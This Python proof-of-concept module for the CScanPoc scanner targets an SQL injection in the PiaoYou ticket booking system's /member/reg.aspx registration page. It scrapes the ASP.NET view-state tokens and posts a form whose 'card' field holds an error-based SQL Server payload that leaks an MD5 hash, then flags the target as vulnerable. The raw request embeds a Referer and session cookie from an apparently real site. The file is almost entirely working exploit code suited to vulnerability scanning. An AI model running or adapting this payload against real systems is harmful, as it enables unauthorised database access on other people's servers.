# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
import urllib


class Vuln(ABVuln):
    vuln_id = 'PiaoYou_0013'  # 平台漏洞编号，留空
    name = '票友订票系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-17'  # 漏洞公布时间
    desc = '''
        票友订票系统存在SQL注入漏洞：
        /member/reg.aspx
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PiaoYou(票友软件)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '38fc4f6d-4b8d-4b04-b6cf-7b509c1d0e90'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.12 http://www.wooyun.org/bugs/wooyun-2010-0101555
            payload = "/member/reg.aspx"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target)
            view = re.findall("id=\"__VIEWSTATE\" value=\"([^>]+)\"", body)
            event = re.findall(
                "id=\"__EVENTVALIDATION\" value=\"([^>]+)\" />", body)
            if len(view) > 0 and len(event) > 0:
                raw = '''
POST xx HTTP/1.1
Host: xx
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://www.89937373.com/member/reg.aspx
Cookie: ASP.NET_SessionId=lehzsqepjxlufl55vopme4j5; CNZZDATA3807746=cnzz_eid%3D1463217541-1438622575-%26ntime%3D1438622575
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 817

__VIEWSTATE=''' + urllib.quote(view[0]) + '''&__EVENTVALIDATION=''' + urllib.quote(event[0]) + '''&uc1%24password=&uc1%24tb_confirm=&levelm=%E6%99%AE%E9%80%9A&card=73333%27%29%20and%2f%2a%2a%2f1%3dconvert%28int%2C%28select%2f%2a%2a%2fsys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271%27%29%29%29%29%20and%2f%2a%2a%2f%28%271%27%3d%271&name=1&pwd=32131&lxr=2&sex=%E7%94%B7&phone=3&mobile=9&fax=4&mail=0&qq=55&msn=1&address=6®ok=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C
                '''
                code, head, body, errcode, final_url = hh.http(target, raw=raw)

                if 'c4ca4238a0b923820dcc509a6f75849' in body:
                    # security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
